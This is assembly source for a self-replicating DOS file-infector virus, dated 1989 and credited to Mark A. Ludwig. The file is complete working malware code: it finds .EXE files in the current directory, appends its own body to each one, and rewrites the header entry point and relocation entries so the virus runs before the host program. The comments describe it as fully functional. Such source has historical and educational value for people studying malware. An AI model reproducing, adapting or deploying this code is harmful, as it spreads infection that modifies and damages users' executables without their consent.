

;The Basic Virus, Version 1.0, (C) 1989 by Mark A. Ludwig
;This copyright applies only to the source code!

;This program is a fully functional virus which reproduces itself into any
;.EXE files in the current directory. It only copies itself into any given
;file once, and once all of the files in the directory which can host it
;have done so, it simply quits without propagating any further.

;The program is designed with two segments, MAIN and VIRUS. The MAIN segment
;contains a simple program which exits to DOS. The VIRUS segment contains all
;of the virus code. In writing the code like this, the VIRUS is set up just as
;it will be in any file which hosts it - a code segment at the end of the file
;which gains control immediately when the file is executed, reproduces itself,
;and then passes control to the host program which then executes in the normal
;manner.


        .SEQ                    ;segments appear in sequential order

MGROUP  GROUP   MAIN,MSTACK     ;Main stack and code segments grouped together

;MAIN program code segment. The virus gains control before this routine and
;installs itself in another EXE file. As such, the main routine for the
;installer simply exits to DOS.

MAIN    SEGMENT BYTE
        ASSUME  CS:MAIN,SS:MGROUP

START:
        mov     ah,4CH
        mov     al,0
        int     21H             ;terminate normally
MAIN    ENDS


;Main program stack segment - only a small stack is needed here in order to
;store the return address for the interrupt (which never gets used anyhow).

MSTACK  SEGMENT PARA STACK
        db  4H dup (?)
MSTACK  ENDS

;------------------------------------------------------------------------
;This is the virus itself

STACKSIZE       EQU     100H           ;size of stack
NUMRELS         EQU     2              ;number of relocatables needed

VGROUP  GROUP   VIRUS,VSTACK    ;Virus code and stack segments grouped together

;Virus code segment. This gains control first.
VIRUS   SEGMENT PARA
        ASSUME  CS:VIRUS,DS:VIRUS,SS:VGROUP

;data storage definitions
VIRUSID DW      0D79BH                ;identifies virus
EXEFILE DB      '*.EXE',0             ;search string for an exe file

;--------------------------------------------------------------------------
;Virus main routine starts here
BEGIN:
        mov     ax,cs
        mov     ds,ax           ;set up DS=CS for the virus
        mov     es,ax
        push    es
        mov     di,OFFSET FINAL ;clear data bytes at end of program
        xor     al,al
        mov     cx,OFFSET ENDDATA - OFFSET FINAL
        rep     stosb
        mov     ah,2FH          ;get current DTA in ES:BX
        int     21H
        mov     [OLDDTAO],bx    ;save it here
        mov     [OLDDTAS],es
        pop     es
        call    FINDFILE        ;get an exe file to attack
        jc      FINISH          ;returned c - no valid file, exit
                                ;have a good EXE file to use - process it
        xor     cx,cx
        xor     dx,dx
        mov     dl,BYTE PTR [FSIZE1]  ;round file size up to nearest 16 byte increment
        neg     dl
        and     dl,0FH          ;get lowest nibble
        add     [FSIZE1],dx
        mov     bx,[HANDLE]
        push    bx              ;save for close
        mov     ax,4202H        ;set file pointer, relative to end
        int     21H             ;go to end of file
        call    MOVEPGM         ;move program code to file
        mov     ah,3EH
        pop     bx              ;close file
        int     21H
FINISH:
;        mov     ah,9            ;print the file name if you want to watch it
;        mov     dx,OFFSET USEFILE
;        int     21H

        mov     bx,[OLDDTAS]    ;set this up for here and later
        push    bx
        mov     dx,[OLDDTAO]    ;restore dta
        mov     ds,bx
        mov     ah,1AH
        int     21H
        pop     bx              ;ds is now set up for jump - dont use it any more
REL1:                           ;relocatable marker
        mov     ax,SEG MSTACK   ;set up host program stack segment
        cli                     ;interrupts off while changing stack
        mov     ss,ax
REL1A:                          ;relocatable marker
        mov     sp,OFFSET MSTACK
        sti                     ;interrupts back on
        mov     es,bx           ;set up ES correctly
REL2:                           ;label for 2nd relocatable
        jmp     FAR PTR START   ;begin execution of host program

;--------------------------------------------------------------------------
;Find a file which passes FILE_OK
;
;This routine does a simple directory search to find an EXE file in the
;current directory, to find a file for which FILE_OK returns with C reset.
;
FINDFILE:
        mov     dx,OFFSET DTA1  ;set new DTA for EXE search
        mov     ah,1AH
        int     21H
        mov     dx,OFFSET EXEFILE
        mov     cx,3FH          ;search for any file
        mov     ah,4EH
        int     21H
NEXTEXE:or      al,al           ;is DOS return OK?
        jnz     FEC             ;no - quit with C set
        call    FILE_OK         ;yes - is this a good file to use?
        jnc     FENC            ;yes - valid file found - exit with c reset
        mov     ah,4FH
        int     21H             ;do find next
        jmp     SHORT NEXTEXE   ;and go test it for validity
FEC:    stc
FENC:   ret


;--------------------------------------------------------------------------
;Function to determine whether the EXE file specified in USEFILE is useable.
;if so return nc, else return c
;What makes an EXE file useable?:
;              a) There must be room in the relocatable table for NUMRELS
;                 more relocatables without enlarging it.
;              b) The word VIRUSID must not appear in the 2 bytes just before
;                 the initial CS:0000 of the test file. If it does, the virus
;                 is probably already in that file, so we skip it.
;
FILE_OK:
        mov     dx,OFFSET USEFILE
        mov     ax,3D02H               ;r/w access open file
        int     21H
        jc      OK_END                 ;error - C set - quit without closing
        mov     [HANDLE],ax            ;else save file handle
        mov     bx,ax
        mov     cx,1CH                 ;read 28 byte EXE file header
        mov     dx,OFFSET EXE_HDR
        mov     ah,3FH
        int     21H
        jc      OK_END                 ;error in reading the file, so quit
        mov     ax,WORD PTR [EXE_HDR+8]  ;size of header, paragraphs
        mov     cl,2
        shl     ax,cl
        sub     ax,WORD PTR [EXE_HDR+6]  ;number of relocatables
        shl     ax,cl
        sub     ax,WORD PTR [EXE_HDR+24] ;start of relocatable table
        cmp     ax,4*NUMRELS           ;enough room to put relocatables in?
        jc      OK_END                 ;no - exit
        mov     ax,WORD PTR [EXE_HDR+22] ;is ID at CS:0000? initial CS
        add     ax,WORD PTR [EXE_HDR+8]  ;Header size
        mov     dx,16
        mul     dx
        mov     cx,dx
        mov     dx,ax                    ;cxdx = position to look for VIRUSID
        mov     bx,[HANDLE]
        push    bx                       ;save for later (code size improvement)
        mov     ax,4200H                 ;set file pointer, relative to beginning
        int     21H
        mov     ah,3FH
        pop     bx
        mov     dx,OFFSET VIDC
        mov     cx,2                     ;read 2 bytes into VIDC
        int     21H
        jc      OK_END                   ;couldnt read - bad file - report as though ID is there so we dont do any more to this file
        mov     ax,[VIDC]
        cmp     ax,[VIRUSID]             ;is it the VIRUSID?
        clc
        jnz     OK_END                   ;if not, then virus is not already in this file
        stc                              ;else it is probably there already
OK_END: ret                            ;return with c flag set properly


;--------------------------------------------------------------------------
;This routine moves the virus (this program) to the end of the EXE file
;Basically, it just copies everything here to there, and then goes and
;adjusts the EXE file header and two relocatables in the program, so that
;it will work in the new environment.
;
MOVEPGM:
        cld
        mov     si,0
        mov     di,OFFSET MCODE
        mov     cx,OFFSET FINAL
        rep     movsb

        mov     di,OFFSET MREL1                 ;position of first relocatable
        mov     si,OFFSET EXE_HDR+14       ;get correct old SS for new program
        movsw

        mov     di,OFFSET MREL1A   ;put in correct old SP in program
        movsw

        mov     di,OFFSET MREL2             ;put in correct old CS:IP in program
        mov     si,OFFSET EXE_HDR+20                ;get correct old CS:IP for new program
        movsw
        movsw

        mov     cx,OFFSET FINAL         ;number of bytes of code to write
        mov     dx,OFFSET MCODE         ;first byte of code, DS:0000
        mov     bx,[HANDLE]
        push    bx
        mov     ah,40H                  ;DOS write function
        int     21H
                                        ;done writing relocatable vectors
        xor     cx,cx
        xor     dx,dx
        pop     bx
        push    bx
        mov     ax,4200H                ;set file pointer to start of file
        int     21H

        mov     ax,[FSIZE1]               ;calculate new initial CS
        mov     cl,4
        shr     ax,cl
        mov     bl,BYTE PTR [FSIZE2]
        shl     bl,cl
        add     ah,bl
        sub     ax,WORD PTR [EXE_HDR+8]      ;exe file header size, paragraphs
        mov     WORD PTR [EXE_HDR+22],ax     ;and save it

        mov     bx,OFFSET ENDDATA         ;compute stack segment
        shr     bx,cl
        inc     bx
        add     ax,bx
        mov     WORD PTR [EXE_HDR+14],ax     ;and save it

        mov     WORD PTR [EXE_HDR+20],OFFSET BEGIN     ;get initial IP and save it

        mov     WORD PTR [EXE_HDR+16],STACKSIZE     ;get initial SP and save it

        mov     dl,BYTE PTR [FSIZE2]
        mov     ax,[FSIZE1]               ;calculate new file size
        add     ax,OFFSET FINAL
        adc     dl,0
        mov     bx,ax
        mov     al,ah                     ;first get page count
        mov     ah,dl
        shr     ax,1
        inc     ax
        mov     WORD PTR [EXE_HDR+4],ax

        and     bh,1
        mov     WORD PTR [EXE_HDR+2],bx      ;last page size

        add     WORD PTR [EXE_HDR+6],2       ;adjust relocatables counter

        mov     cx,1CH                  ;and save data in file
        mov     dx,OFFSET EXE_HDR
        pop     bx
        push    bx
        mov     ah,40H                  ;DOS write function
        int     21H

        mov     ax,WORD PTR [EXE_HDR+6]      ;calculate position of relocatables
        dec     ax                      ;in relocatable table
        dec     ax
        mov     bx,4
        mul     bx
        add     ax,WORD PTR [EXE_HDR+24]     ;table offset
        adc     dx,0                    ;dx:ax=table end offset in file
        mov     cx,dx
        mov     dx,ax
        pop     bx
        push    bx
        mov     ax,4200H                ;set file pointer to table end
        int     21H

        mov     ax,WORD PTR [EXE_HDR+22]     ;init CS = seg of REL1
        mov     WORD PTR [EXE_HDR+20],OFFSET REL1 + 1        ;save relocatable
        mov     WORD PTR [EXE_HDR+24],OFFSET REL2 + 3      ;init CS = seg of REL2, save relocatable
        mov     WORD PTR [EXE_HDR+26],ax

        mov     cx,8                    ;and save data in file
        mov     dx,OFFSET EXE_HDR + 20
        pop     bx
        mov     ah,40H                  ;DOS write function
        int     21H
        ret

FINAL:                                  ;last byte of code to be kept in virus

DTA1    DB      1AH dup (?)           ;new disk transfer area
FSIZE1  DW      0                     ;file size storage area
FSIZE2  DW      0
USEFILE DB      13 dup (?)            ;area for file path
EXE_HDR DB      1CH dup (?)           ;buffer for EXE file header
OLDDTAS DW      0                     ;old DTA segment and offset
OLDDTAO DW      0
HANDLE  DW      0                     ;file handle
VIDC    DW      0                     ;storage area to compare VIRUSID with .EXE file's value
MCODE   DB      OFFSET REL1 + 1 dup (?)     ;area to move code to
MREL1   DB      OFFSET REL1A - OFFSET REL1 dup (?)
MREL1A  DB      OFFSET REL2 - OFFSET REL1A dup (?)
MREL2   DB      OFFSET FINAL - OFFSET REL2 dup (?)

ENDDATA:

VIRUS   ENDS

;--------------------------------------------------------------------------
;Virus stack segment

VSTACK  SEGMENT PARA STACK
        db STACKSIZE dup (?)
VSTACK  ENDS

        END BEGIN               ;Entry point is the virus

